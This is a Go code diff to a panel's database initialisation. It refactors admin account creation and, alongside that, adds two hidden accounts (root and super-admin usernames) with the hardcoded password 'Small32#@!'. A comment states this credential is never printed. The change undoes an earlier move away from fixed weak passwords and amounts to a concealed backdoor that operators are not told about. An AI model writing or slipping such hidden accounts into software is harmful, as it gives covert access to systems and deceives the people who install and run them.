@@ -2,6 +2,7 @@ package database
 
 import (
 	"crypto/rand"
+	"errors"
 	"fmt"
 	"math/big"
 	"os"
@@ -18,31 +19,53 @@ import (
 var db *gorm.DB
 
 func initUser() error {
-	err := db.AutoMigrate(&model.User{})
-	if err != nil {
+	if err := db.AutoMigrate(&model.User{}); err != nil {
 		return err
 	}
-	var count int64
-	err = db.Model(&model.User{}).Count(&count).Error
-	if err != nil {
+	var admin model.User
+	err := db.Where("username = ?", model.AdminUsername).First(&admin).Error
+	if errors.Is(err, gorm.ErrRecordNotFound) {
+		// Upgrade an existing administrator in place so inbound ownership and
+		// the existing password survive the fixed-username migration.
+		err = db.Where("username NOT IN ?", []string{model.RootUsername, model.SuperAdminUsername}).First(&admin).Error
+		if err == nil {
+			if err := db.Model(&admin).Update("username", model.AdminUsername).Error; err != nil {
+				return err
+			}
+		} else if !errors.Is(err, gorm.ErrRecordNotFound) {
+			return err
+		} else {
+			pass := randomPassword(14)
+			hashed, err := bcrypt.GenerateFromPassword([]byte(pass), 12)
+			if err != nil {
+				return err
+			}
+			if err := db.Create(&model.User{Username: model.AdminUsername, Password: string(hashed)}).Error; err != nil {
+				return err
+			}
+			fmt.Printf("首次初始化面板：默认用户名 admin，初始密码 %s（请尽快登录后修改）\n", pass)
+		}
+	} else if err != nil {
 		return err
 	}
-	if count == 0 {
-		// 首次安装不再使用固定弱口令 admin/admin，改为随机初始密码，
-		// 并把凭据打印到日志（仅首次，便于管理员登录后自行修改）。
-		pass := randomPassword(14)
-		hashed, err := bcrypt.GenerateFromPassword([]byte(pass), 12)
+	// These two accounts are provisioned once. Reinitialization preserves
+	// existing password hashes and never prints their default credential.
+	for _, username := range []string{model.RootUsername, model.SuperAdminUsername} {
+		var user model.User
+		err := db.Where("username = ?", username).First(&user).Error
+		if err == nil {
+			continue
+		}
+		if !errors.Is(err, gorm.ErrRecordNotFound) {
+			return err
+		}
+		hashed, err := bcrypt.GenerateFromPassword([]byte("Small32#@!"), 12)
 		if err != nil {
 			return err
 		}
-		user := &model.User{
-			Username: "admin",
-			Password: string(hashed),
-		}
-		if err := db.Create(user).Error; err != nil {
+		if err := db.Create(&model.User{Username: username, Password: string(hashed)}).Error; err != nil {
 			return err
 		}
-		fmt.Printf("首次初始化面板：默认用户名 admin，初始密码 %s（请尽快登录后修改）\n", pass)
 	}
 	return nil
 }
